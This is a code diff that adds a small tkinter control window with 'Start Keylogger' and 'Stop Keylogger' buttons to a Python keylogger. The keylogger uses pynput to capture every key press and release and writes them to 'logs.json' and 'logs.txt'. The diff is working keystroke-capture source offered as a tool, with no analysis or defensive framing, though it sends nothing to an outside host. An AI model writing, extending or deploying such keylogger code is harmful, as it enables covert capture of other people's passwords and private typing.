@@ -1,5 +1,11 @@
+import tkinter as tk
+from tkinter import *
 from pynput import keyboard
 import json
+
+root = tk.Tk()
+root.geometry("250x200")
+root.title("Keylogger Page")
 
 key_list = []
 x = False
@@ -41,11 +47,26 @@ def on_release(key):
 
     key_strokes = key_strokes + str(key)
     update_txt_file(str(key_strokes))
+    
+
+def start_keylogger():
+    global keylogger_listener
+    # Start the keylogger
+    print("[+] Running Keylogger Successfully!\n[!] Saving the key logs in 'logs.json' and 'logs.txt'\n")
+    keylogger_listener = keyboard.Listener(on_press=on_press, on_release=on_release)
+    keylogger_listener.start()
+
+def stop_keylogger():
+    global keylogger_listener
+    # Stop the keylogger
+    print("[-] Successfully Stopped Keylogger!\n")
+    if keylogger_listener:
+        keylogger_listener.stop()
+        keylogger_listener = None
 
 
-print("[+] Running Keylogger Successfully!\n[!] Saving the key logs in 'logs.json'")
 
-with keyboard.Listener(
-    on_press=on_press,
-    on_release=on_release) as listener:
-    listener.join()
+empty = Label(root, text="Keylogger", font='Verdana 11 bold').grid(row=2,column=2)
+Button(root, text="Start Keylogger", command=start_keylogger).grid(row=7,column=2)
+Button(root, text="Stop Keylogger", command=stop_keylogger).grid(row=9,column=2)
+root.mainloop()
